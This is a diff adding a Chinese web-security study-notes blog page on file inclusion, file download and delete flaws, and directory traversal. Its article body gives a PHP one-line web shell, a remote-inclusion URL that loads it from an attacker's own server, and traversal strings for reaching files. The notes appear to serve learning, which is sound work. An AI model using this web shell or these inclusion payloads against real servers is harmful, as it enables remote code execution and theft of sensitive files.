@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><link rel="mask-icon" href="/images/logo.svg" color=""><meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss&#43;xml" title="扬名立万_ymlw" href="/index.xml"><link rel="alternate" type="application/json" title="扬名立万_ymlw" href="/index.json"><link rel="stylesheet" href="/css/local-fonts.css"><link rel="stylesheet" href="/css/app.css">
+<style>body { font-family: "Mulish", -apple-system,"PingFang SC","Microsoft YaHei",sans-serif; }#brand .artboard { font-family: "Fredericka the Great", -apple-system,"PingFang SC","Microsoft YaHei",sans-serif; }#brand h1,
+      h1.title, h2.title, h3.title, h4.title, h5.title, h6.title { font-family: Mulish, "Noto Serif JP", "Noto Serif SC", -apple-system,"PingFang SC","Microsoft YaHei",sans-serif; }h1, h2, h3, h4, h5, h6 { font-family: Mulish, "Noto Serif SC", "Noto Serif JP", -apple-system,"PingFang SC","Microsoft YaHei",sans-serif; }code, pre, kbd, samp, .highlight code, .highlight pre, .code-container { font-family: "Inconsolata", consolas,Menlo,"PingFang SC","Microsoft YaHei",monospace; }</style>
+<style>
+  .highlight pre span[style*="background-color"] {
+    background-color: transparent !important;
+    color: inherit !important;
+  }
+</style>
+
+<style>
+  #search .search-highlight {
+    background: var(--color-red-a1);
+    border-radius: .2rem;
+    color: inherit;
+    font-style: normal;
+    padding: 0 .2rem;
+  }
+
+  #search-hits .search-snippet {
+    color: var(--grey-6);
+    font-size: 80%;
+    line-height: 1.6;
+    margin-top: .2rem;
+  }
+</style>
+
+
+  <meta name="keywords" content=""><link rel="canonical" href="https://www.ctfhub.cn/posts/5/"><meta property="og:url" content="https://www.ctfhub.cn/posts/5/">
+  <meta property="og:site_name" content="扬名立万_ymlw">
+  <meta property="og:title" content="Web攻防-50&51天-文件包含、文件安全">
+  <meta property="og:description" content="小迪secWeb攻防学习笔记文件包含">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-18T00:00:00+00:00">
+    <meta property="og:image" content="https://www.ctfhub.cn/images/avatar.jpg">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.ctfhub.cn/images/avatar.jpg">
+  <meta name="twitter:title" content="Web攻防-50&51天-文件包含、文件安全">
+  <meta name="twitter:description" content="小迪secWeb攻防学习笔记文件包含">
+
+  <title>Web攻防-50&amp;51天-文件包含、文件安全 - 网络安全 |
+YMLW Shoka = 扬名立万_ymlw</title>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Web攻防-50&amp;51天-文件包含、文件安全</h1>
+  <div class="meta"><span class="item" title="创建时间：2026-01-18">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-01-18T00:00:00Z">2026-01-18</time>
+  </span></div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">YMLW Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax"><img src="/posts/5/1.png"></div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    <div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 网络安全"><span itemprop="name">网络安全</span></a><meta itemprop="position" content="1"></span></div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-cn">
+  <link itemprop="mainEntityOfPage" href="https://www.ctfhub.cn/posts/5/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/1.jpg">
+    <meta itemprop="name" content="扬名立万">
+    <meta itemprop="description" content=", 网安 &amp; 取证的学习笔记">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="扬名立万_ymlw">
+  </span>
+
+  <div class="body md" itemprop="articleBody"><h1 id="0x00相关概念">
+  <a class="anchor" href="#0x00%e7%9b%b8%e5%85%b3%e6%a6%82%e5%bf%b5" aria-label="Anchor"></a>
+  0x00相关概念
+</h1>
+<p>代码执行：</p>
+<p><strong>本地包含</strong>：攻击者通过构造路径，读取服务器上的敏感文件（如配置文件、日志文件）。</p>
+<p>利用：</p>
+<ul>
+<li>有文件利用：上传一个文件 文件写有我们构造好的恶意代码（配合上传）</li>
+<li>无文件利用：
+1、包含日志文件利用
+2、包含session文件利用
+3、伪协议利用</li>
+</ul>
+<p><strong>远程包含</strong>：当PHP配置中<code>allow_url_include</code>和<code>allow_url_fopen</code>开启时，攻击者可加载远程恶意脚本。</p>
+<p>示例：
+上传一个 <code>1.txt</code> 内容为一句话木马在自己服务器：</p>
+<figure class="highlight php">
+  <figcaption data-lang="php"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">eval</span>($_POST[<span style="color:#ae81ff">1</span>]);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"></span></span></pre></td>
+          </tr></table>
+</figure>
+<p>上传后访问，以http协议读取：</p>
+<figure class="highlight http">
+  <figcaption data-lang="http"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span><span style="color:#960050;background-color:#1e0010">http://xxx.com/include.php?file=http://your vps.com/1.txt</span></span></pre></td>
+          </tr></table>
+</figure>
+<p>即可通过蚁剑链接。</p>
+<h1 id="文件安全-下载删除-黑白盒">
+  <a class="anchor" href="#%e6%96%87%e4%bb%b6%e5%ae%89%e5%85%a8-%e4%b8%8b%e8%bd%bd%e5%88%a0%e9%99%a4-%e9%bb%91%e7%99%bd%e7%9b%92" aria-label="Anchor"></a>
+  文件安全-下载&amp;删除-黑白盒
+</h1>
+<p>1、下载=读取</p>
+<p>常规下载URL：http://www.xxx.com/upload/123.pdf</p>
+<p>可能存在安全URL：http://www.xxx.com/xx.xx?file=123.pdf</p>
+<p>利用：常规下载敏感文件（数据库配置、中间件配置、系统密钥等文件信息）</p>
+<p>2、文件删除（常出现在后台中）</p>
+<p>可能存在的安全问题：前台或后台有删除功能应用</p>
+<p>利用：常规删除重装锁定配合程序重装或高危操作</p>
+<h1 id="目录安全-遍历穿越-黑白盒">
+  <a class="anchor" href="#%e7%9b%ae%e5%bd%95%e5%ae%89%e5%85%a8-%e9%81%8d%e5%8e%86%e7%a9%bf%e8%b6%8a-%e9%bb%91%e7%99%bd%e7%9b%92" aria-label="Anchor"></a>
+  目录安全-遍历&amp;穿越-黑白盒
+</h1>
+<p>1、目录遍历</p>
+<p>目录权限控制不当，通过遍历获取到有价值的信息文件去利用</p>
+<p>2、目录穿越（常出现在后台中）</p>
+<p>../../../../../绕过</p>
+<p><img src="/content/posts/%e5%b0%8f%e8%bf%aaweb50%e5%a4%a9%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab/1.png" data-src="/content/posts/%e5%b0%8f%e8%bf%aaweb50%e5%a4%a9%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab/1.png" loading="lazy" alt="../../../绕过"></p>
+<h1 id="黑盒分析">
+  <a class="anchor" href="#%e9%bb%91%e7%9b%92%e5%88%86%e6%9e%90" aria-label="Anchor"></a>
+  黑盒分析
+</h1>
+<p>1、功能点</p>
+<p>文件上传，文件下载，文件删除，文件管理器等地方</p>
+<p>2、URL特征</p>
+<p>文件名：</p>
+<p>download,down,readfile,read,del,dir,path,src,Lang等</p>
+<p>参数名：</p>
+<p>file,path,data,filepath,readfile,data,url,realpath等</p>
+<h1 id="白盒分析">
+  <a class="anchor" href="#%e7%99%bd%e7%9b%92%e5%88%86%e6%9e%90" aria-label="Anchor"></a>
+  白盒分析
+</h1>
+<p>上传类函数，删除类函数，下载类函数，目录操作函数，读取查看函数等</p>
+<p>参考文章：</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmVrZXI2Mi9wLzE1MzIyNzcxLmh0bWw=">https://www.cnblogs.com/Zeker62/p/15322771.html</span></li>
+</ul>
+<div class="tags"><a href="/tags/" rel="tag"><i class="ic i-tag"></i> </a></div></div>
+
+  <footer>
+    <div class="meta"></div>
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr"><div>
+        <img data-src="/images/alipay.jpg" alt="支付宝">
+        <p>支付宝</p>
+      </div><div>
+        <img data-src="/images/paypal.jpg" alt="贝宝">
+        <p>贝宝</p>
+      </div><div>
+        <img data-src="/images/wechatpay.jpg" alt="微信支付">
+        <p>微信支付</p>
+      </div></div>
+</div><div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>扬名立万 <i class="ic i-at"><em>@</em></i>扬名立万_ymlw
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong><a href="https://www.ctfhub.cn/posts/5/" title="Web攻防-50&amp;51天-文件包含、文件安全">https://www.ctfhub.cn/posts/5/</a></li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li>
+</ul>
+</div></footer>
+
+</article>
+
+  </div>
+  <div class="post-nav">
+  <div class="item left"><a href="/posts/4/" title="Web攻防-46天-sqlmap使用" itemprop="url" data-background-image="/posts/4/1.png" rel="prev"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i> 网络安全</span><h3>Web攻防-46天-sqlmap使用</h3></a></div>
+  <div class="item right"><a href="/posts/web-js/" title="Web攻防-63-65天-JS应用" itemprop="url" data-background-image="/1.png" rel="next"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i> 网络安全</span><h3>Web攻防-63-65天-JS应用</h3></a></div>
+</div>
+
+  
+
+        </div>
+        <div id="sidebar">
+          
+  <div class="inner">
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录"><nav id="TableOfContents" class="toc"></nav></div>
+      <div class="related panel pjax" data-title="系列文章"><ul><li><a href="/posts/web-60-62-php-deserialization/" title="Web攻防-60-62PHP反序列化">Web攻防-60-62PHP反序列化</a></li><li><a href="/posts/web-59-xml-xxe/" title="Web攻防-59天XML&amp;XXE">Web攻防-59天XML&XXE</a></li><li><a href="/posts/10/" title="Web攻防-58天RCE命令执行">Web攻防-58天RCE命令执行</a></li><li><a href="/posts/kali-update-share-mount/" title="kali系统更新以及共享文件夹挂载">kali系统更新以及共享文件夹挂载</a></li><li><a href="/posts/web-57-ssrf/" title="Web攻防-57天SSRF服务端">Web攻防-57天SSRF服务端</a></li></ul></div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="扬名立万"
+      data-src="/images/1.jpg">
+  <p class="name" itemprop="name">扬名立万</p>
+  <div class="description" itemprop="description">网安 &amp; 取证的学习笔记</div>
+</div>
+
+<nav class="state"><div class="item posts">
+      <a href="/archives/">
+        <span class="count">16</span>
+        <span class="name">文章</span>
+      </a>
+    </div><div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">分类</span>
+      </a>
+    </div><div class="item tags">
+      <a href="/tags/">
+        <span class="count">4</span>
+        <span class="name">标签</span>
+      </a>
+    </div></nav>
+
+<div class="social"><span class="exturl item email" data-url="bWFpbHRvOnlvdXJuYW1lQG1haWwuY29t" title="mailto:yourname@mail.com"><i class="ic i-envelope"></i></span><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lvdXJuYW1l" title="https://github.com/yourname"><i class="ic i-github"></i></span><span class="exturl item instagram" data-url="aHR0cHM6Ly9pbnN0YWdyYW0uY29tL3lvdXJuYW1l" title="https://instagram.com/yourname"><i class="ic i-instagram"></i></span><span class="exturl item x" data-url="aHR0cHM6Ly94LmNvbS95b3VybmFtZQ==" title="https://x.com/yourname"><i class="ic i-x"></i></span></div>
+
+<ul class="menu">
+  <li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="javascript:void(0);" class="search" rel="section"><i class="ic i-search"></i>搜索</a></li>
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax"><a href="/posts/4/" title="上一篇" rel="prev"><i class="ic i-chevron-left"></i></a></li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax"><a href="/posts/web-js/" title="下一篇" rel="next"><i class="ic i-chevron-right"></i></a></li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          <div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/7/" title="Web攻防-56天CSRF客户端">Web攻防-56天CSRF客户端</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/debug/" title="分类于 Debug">Debug</a></div>
+<span><a href="/posts/githublocalshell/" title="Github本地上传笔记">Github本地上传笔记</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/6/" title="Web攻防-52-55天-XSS跨站">Web攻防-52-55天-XSS跨站</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/web-60-62-php-deserialization/" title="Web攻防-60-62PHP反序列化">Web攻防-60-62PHP反序列化</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/kali-update-share-mount/" title="kali系统更新以及共享文件夹挂载">kali系统更新以及共享文件夹挂载</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/web-js/" title="Web攻防-63-65天-JS应用">Web攻防-63-65天-JS应用</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/3/" title="Web攻防-42天">Web攻防-42天</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a></div>
+<span><a href="/posts/rust/" title="Rust学习">Rust学习</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/cve-2025-55182/" title="CVE-2025-55182">CVE-2025-55182</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/web-57-ssrf/" title="Web攻防-57天SSRF服务端">Web攻防-57天SSRF服务端</a></span>
+      </li></ul>
+</div><div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+        </div>
+        <div class="status">
+  <div class="copyright">
+    &copy;<span itemprop="copyrightYear">2026</span><span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">扬名立万 @ YMLW Shoka</span><br>
+      <span class="copyright-extra">© 2025 扬名立万_ymlw   <a href='https://beian.miit.gov.cn/' target='_blank'>苏ICP备2024061653号-1</a></span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9nb2h1Z28uaW8=">Hugo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div></div>
+
+      </div>
+    </footer>
+  </div>
+
+  <script data-config type="text/javascript">
+  var CONFIG = {"auto_scroll":true,"css":{"fancybox":"vendor/fancybox.bundle.min.css","katex":"vendor/katex.min.css","mermaid":"css/mermaid.css","valine":"css/comment.css"},"darkmode":false,"favicon":{"hidden":"images/failure.ico","normal":"images/favicon.ico"},"fireworks":["rgba(255,182,185,.9)","rgba(250,227,217,.9)","rgba(187,222,214,.9)","rgba(138,198,209,.9)"],"hostname":"https://www.ctfhub.cn","js":{"chart":"vendor/frappe-charts.min.iife.min.js","copy_tex":"vendor/katex-copy-tex.min.js","fancybox":"vendor/fancybox.bundle.min.js","valine":"vendor/minivaline.min.js"},"loader":{"start":true,"switch":false},"quicklink":{"priority":true,"timeout":3000},"root":"/","search":null,"search_hits":{"per_page":10},"statics":"/","valine":{"NoRecordIP":false,"appId":null,"appKey":null,"avatar":"mp","lang":"en","pageSize":10,"placeholder":"ヽ(○´∀`)ﾉ♪","powerMode":true,"serverURLs":null,"tagColor":{"friend":"var(--color-aqua)","investor":"var(--color-pink)","master":"var(--color-orange)"},"tagMember":{"friend":null,"investor":null,"master":null},"tagMeta":{"friend":"小伙伴","investor":"金主粑粑","master":"主人","visitor":"新朋友"},"visitor":true},"version":"0.2.5"};
+  var LOCAL = {"copyright":"复制成功，转载请遵守 \u003cspan class=\"exturl\" data-url=\"aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo\"\u003e\u003ci class=\"ic i-creative-commons\"\u003e\u003c/i\u003eBY-NC-SA\u003c/span\u003e 协议。","fancybox":true,"favicon":{"hide":"(´Д｀)大変だ！","show":"（●´3｀●）やれやれだぜ"},"path":"posts/5/","search":{"empty":"关于 「 ${query} 」，什么也没搜到","placeholder":"文章搜索","stats":"${time} ms 内找到 ${hits} 条结果"}};
+  LOCAL.ignores = [
+    function(uri) {
+      return uri.includes('#');
+    },
+    function(uri) {
+      return new RegExp(LOCAL.path + '$').test(uri);
+    }
+  ];
+</script>
+
+
+  <script src="/vendor/pace.min.js"></script><script src="/vendor/pjax.min.js"></script><script src="/vendor/fetch.umd.min.js"></script><script src="/vendor/anime.min.js"></script><script src="/vendor/algoliasearch-lite.umd.js"></script><script src="/vendor/instantsearch.production.min.js"></script><script src="/vendor/lozad.min.js"></script><script src="/vendor/quicklink.umd.js"></script>
+
+  <script src="/js/app.js"></script><script src="/js/fireworks.js"></script>
+
+</body>
+</html>
